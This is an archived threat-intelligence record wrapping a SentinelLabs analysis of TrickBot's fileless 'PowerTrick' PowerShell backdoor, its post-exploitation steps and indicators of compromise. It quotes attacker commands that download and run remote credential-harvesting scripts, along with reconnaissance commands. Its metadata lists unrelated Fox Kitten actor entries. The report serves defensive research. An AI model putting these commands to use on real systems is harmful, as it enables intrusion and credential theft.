{
    "id": "34f9a5c5-0742-4f1a-95a4-a6d1a5a91a24",
    "created_at": "2023-01-12T15:06:05.143327Z",
    "updated_at": "2025-03-27T02:06:03.242851Z",
    "deleted_at": null,
    "sha1_hash": "3fb8938245ad4836d73a3b1a1e0235ee21346fcb",
    "title": "2020-01-09 - Top-Tier Russian Organized Cybercrime Group Unveils Fileless Stealthy “PowerTrick” Backdoor for High-Value Targets",
    "authors": "",
    "file_creation_date": "2022-05-28T04:42:14Z",
    "file_modification_date": "2022-05-28T04:42:14Z",
    "file_size": 1376590,
    "plain_text": "# Top-Tier Russian Organized Cybercrime Group Unveils Fileless Stealthy “PowerTrick” Backdoor for High-Value Targets\n\n**labs.sentinelone.com/top-tier-russian-organized-cybercrime-group-unveils-fileless-stealthy-powertrick-backdoor-for-**\nhigh-value-targets/\n\nVitali Kremez\n\n_Research by:_ _[Vitali Kremez,](https://www.sentinelone.com/wp-content/uploads/author/vitalik/)_ _[Joshua Platt and](https://www.sentinelone.com/wp-content/uploads/author/joshuap/)_ _[Jason Reaves](https://www.sentinelone.com/wp-content/uploads/author/Jasonr/)_\n\n[Read the Full Report](https://assets.sentinelone.com/labs/39-ogc2h)\n\n## Executive Summary\n\nThe TrickBot cybercrime enterprise actively develops many of its offensive tools such\nas “PowerTrick” that are leveraged for stealthiness, persistence, and reconnaissance\ninside infected high-value targets such as financial institutions.\nMany of their offensive tools remain undetected for the most part as they are used for a\nshort period of time for targeted post-exploitation purposes such as lateral movement.\nTheir offensive tooling such as “PowerTrick” is flexible and effective which allows the\nTrickBot cybercrime actors to leverage them to augment on the fly and stay stealthy as\nopposed to using larger more open source systems such as PowerShell Empire.\nThe end-goal of the PowerTrick backdoor and its approach is to bypass restrictions and\nsecurity controls to adapt to the new age of security controls and exploit the most\nprotected and secure high-value networks.\n\n\n-----\n\nSentinelLabs developed mock command-and-control panels to allow the institutions to\nutilize them for testing detections related to “PowerTrick”.\n\n## Background\n\nTrickBot is the successor of Dyre [1, 2] which at first was primarily focused on banking fraud\nin the same manner that Dyre did utilize injection systems. TrickBot has shifted focus to\nenterprise environments over the years to incorporate many techniques from network\nprofiling, mass data collection, incorporation of lateral traversal exploits. This focus shift is\nalso prevalent in their incorporation of malware and techniques in their tertiary deliveries that\nare targeting enterprise environments, it is similar to a company where the focus will shift\ndepending on what generates the best revenue. This research follows SentinelLabs\n[discovery of the TrickBot Anchor malware and its nexus to the organized groups and](https://www.sentinelone.com/wp-content/uploads/the-deadly-planeswalker-how-the-trickbot-group-united-high-tech-crimeware-apt/)\nadvanced persistent threats.\n\nGraph 1: Image of interactive human network exploitation operator within TrickBot enterprise\n\n## PowerTrick Discovery\n\nSentinelLabs research into this PowerShell-based backdoor called “PowerTrick” traces back\nto the initial infection, we assess with high confidence at least some of the initial PowerTrick\ninfections are being kicked off as a PowerShell task through normal TrickBot infections\nutilizing a repurposed backconnect module that can accept commands to execute called\n“NewBCtest”.\n\n\n-----\n\nGraph 2: Image of PowerTrick execution flow\nAfter the initial stager for the “PowerTrick backdoor” is kicked off, then the actor issues the\nfirst command which is to download a larger backdoor. This process is similar to what you\nsee in Powershell Empire with its stager component.\n\nFigure 1: The malware operator issues the first command to download the backdoor.\nPowerTrick is designed to execute commands and return the results in Base64 format, the\nsystem uses a generated UUID based on computer information as a “botID.”\n\nFigure 2: A unique\n\nuser ID (UUID) is generated for each bot\nThe Victim data is then posted back to the controller.\n\n\n-----\n\nFigure 3: The victim data is posted back to the backend.\nPowerTrick is simply designed to execute commands and return results.\n\nFigure 4: Main functionality of PowerTrick\n\n\n-----\n\n## PowerTrick: Actions on Objective\n\nAside from the PowerTrick backdoor, the criminal actors also commonly utilize other\nPowerShell utilities to do various tasks. A frequent one utilized was ‘letmein.ps1’ which is a\nPowershell stager for open-source exploitation framework Metasploit.\n```\niex ((New-Object\nSystem.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafi\n write-output \"loaded\";\niex ((New-Object\nSystem.Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ni\nSessionGopher.ps1')); write-output \"loaded\";\niex ((New-Object\nSystem.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafi\nGPPPassword.ps1')); write-output \"loaded\";\niex ((New-Object\nSystem.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafi\nVaultCredential.ps1')); write-output \"loaded\";\n\n```\nThe letmein script, in particular, is leveraged frequently to pivot the infection to another\nframework.\n\nFigure 5: The actors download and execute letmein stager.\n\nIt is also used to detonate on other systems after pivoting.\n\nFigure 6: use of network drives to download and execute the letmein stager.\n\nThe frequently used commands and actions are as follows:\n\n```\nnet view\n\n```\n```\nnet use\n\n```\n\n-----\n\n```\nping systems\n\n```\n```\nnet use with usernames to check permissions on systems\n\n```\n```\n   WMIC /node:localhost /Namespace:rootSecurityCenter2 Path\n   AntiVirusProduct Get displayName /Format:List\n\n```\nOnce the system and network have been profiled, the actors perform deletion operation and\ncleanup. They remove any existing files that did not execute properly and move on to a\ndifferent target of choice or perform lateral movement inside the environment to high-value\nsystems such as financial gateways. The executed tasks included a wide range of utilities\nsuch as previously shown Metasploit. Other interesting deliveries will be discussed below:\n\nGraph 3: Summary of PowerTrick Connections to Known Malware\n\n**I. TrickBot Anchor Malware**\n\nTrickBot Anchor DNS variant [3] is frequently leveraged as an attack framework for\nenterprise environments.\n\n**II. TerraLoader, “more_eggs” Backdoor**\n\nTerraLoader variant version “6.0” with more_eggs JavaScript backdoor onboard is a\ndeployed payload, often in addition to the aforementioned Anchor DNS variant on the same\nsystems.\n\n\n-----\n\nFigure\n\n7: The decoded “more_eggs” backdoor from TerraLoader.\n\n**III. Direct Shellcode**\n\nDirect shellcode execution is a methodology for payload deployment via a hexlified\nparameter.\n\nFigure 8: The command is designed to process shellcode as a parameter.\nThis is something we have observed frequently where the actors will modify or create new\ndelivery systems in order to bypass restrictions and security controls.\n\n## Attacker View: How PowerTrick Drops TrickBot Anchor Bot\n\n**I. Launch PowerShell**\n\nThe PowerTrick session is initialized with the following command:\n\nAfter PowerTrick is successfully executed, a child PowerShell process is created and the\nattacker issues a series of commands in an effort to choose an existing directory on the\nsystem.\n\n**II. dir command is executed to check the filesystem**\n\n\n-----\n\n**III. Execute PowerShell script to download anchor DNS**\n\n**IV. After the script is executed, the “dir” command is issued again to verify the**\n**download was successful.**\n\n**V. After verifying the download, the file is executed and the scheduled tasks are**\n**checked.**\n\n**VI. The directory is checked again to verify the file successfully self-deleted.**\n\n**VII. In this particular case, a second PowerShell task is executed via PowerTrick. This**\n**file is the more_eggs backdoor described above.**\n\n\n-----\n\n**VIII. Once again the directory is checked to verify the download was successful. In**\n**each case the existing folder name is used for the file.**\n\n**IX. After download verification, the file is executed**\n\n**X. The directory is again checked to verify the file was run and self-deleted.**\n\n**XI. The following PowerShell command is executed to check for the presence of anti-**\n**virus products**\n\n**XII. Processes checked**\n\n**XIII. Session is killed**\n\n### Analyst Note:\n\nThe PowerShell task parent window name was OleMainThreadWndName, while the child\nhad the normal name `C:windowsSystem32WindowsPowerShellv1.0powershell.exe .`\n\n\n-----\n\n## Indicators of Compromise\n\nAnchor (SHA-256):\n```\n   254e7a333ecee6d486b4f8892fe292fb7ba1471fe500651c1ba3e7ff5c9e03c8\n\n```\nTerraLoader (SHA-256):\n```\n   dcf714bfc35071af9fa04c4329c94e385472388f9715f2da7496b415f1a5aa03\n   kostunivo[.]com\n   drive.staticcontent[.]kz\n   web000aaa[.]info\n   wizardmagik[.]best\n   traveldials[.]com\n   northtracing[.]net\n   magichere[.]icu\n   magikorigin[.]me\n   5[.]9.161.246\n   192[.]99.38.41\n   172[.]82.152.15\n   193[.]42.110.176\n\n```\n[IOCs on GitHub](https://github.com/SentineLabs/PowerTrick)\n\n## References\n\n1: [https://blog.malwarebytes.com/threat-analysis/2016/10/trick-bot-dyrezas-successor/](https://blog.malwarebytes.com/threat-analysis/2016/10/trick-bot-dyrezas-successor/)\n\n2: [https://www.fidelissecurity.com/threatgeek/archive/trickbot-we-missed-you-dyre/](https://www.fidelissecurity.com/threatgeek/archive/trickbot-we-missed-you-dyre/)\n\n3: https://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicatingover-dns\n\n[Read the Full Report](https://assets.sentinelone.com/labs/39-ogc2h)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-09 - Top-Tier Russian Organized Cybercrime Group Unveils Fileless Stealthy “PowerTrick” Backdoor for High-Value Targets.pdf"
    ],
    "report_names": [
        "2020-01-09 - Top-Tier Russian Organized Cybercrime Group Unveils Fileless Stealthy “PowerTrick” Backdoor for High-Value Targets.pdf"
    ],
    "threat_actors": [
        {
            "id": "d070e12b-e1ce-4d8d-b5e3-bc71960cc0cb",
            "created_at": "2022-10-25T15:50:23.676504Z",
            "updated_at": "2025-03-27T02:00:55.521901Z",
            "deleted_at": null,
            "main_name": "Fox Kitten",
            "aliases": [
                "Fox Kitten",
                "UNC757",
                "Parisite",
                "Pioneer Kitten",
                "RUBIDIUM",
                "Lemon Sandstorm"
            ],
            "source_name": "MITRE:Fox Kitten",
            "tools": [
                "China Chopper",
                "Pay2Key",
                "ngrok",
                "PsExec",
                "Ngrok"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2c348851-5036-406b-b2d1-1ca47cfc7523",
            "created_at": "2022-10-25T16:07:24.039861Z",
            "updated_at": "2025-03-27T02:02:10.08844Z",
            "deleted_at": null,
            "main_name": "Parisite",
            "aliases": [
                "Cobalt Foxglove",
                "Fox Kitten",
                "Lemon Sandstorm",
                "Parisite",
                "Pioneer Kitten",
                "Rubidium",
                "UNC757"
            ],
            "source_name": "ETDA:Parisite",
            "tools": [
                "Cobalt",
                "FRP",
                "Fast Reverse Proxy",
                "Invoke the Hash",
                "JuicyPotato",
                "Ngrok",
                "POWSSHNET",
                "Pay2Key",
                "Plink",
                "Port.exe",
                "PuTTY Link",
                "SSHMinion",
                "STSRCheck",
                "Serveo"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "871acc40-6cbf-4c81-8b40-7f783616afbc",
            "created_at": "2023-01-06T13:46:39.156237Z",
            "updated_at": "2025-03-27T02:00:03.010146Z",
            "deleted_at": null,
            "main_name": "Fox Kitten",
            "aliases": [
                "PIONEER KITTEN",
                "PARISITE",
                "UNC757",
                "Lemon Sandstorm",
                "RUBIDIUM"
            ],
            "source_name": "MISPGALAXY:Fox Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535965,
    "ts_updated_at": 1743041163,
    "ts_creation_date": 1653712934,
    "ts_modification_date": 1653712934,
    "files": {
        "pdf": "https://archive.orkl.eu/3fb8938245ad4836d73a3b1a1e0235ee21346fcb.pdf",
        "text": "https://archive.orkl.eu/3fb8938245ad4836d73a3b1a1e0235ee21346fcb.txt",
        "img": "https://archive.orkl.eu/3fb8938245ad4836d73a3b1a1e0235ee21346fcb.jpg"
    }
}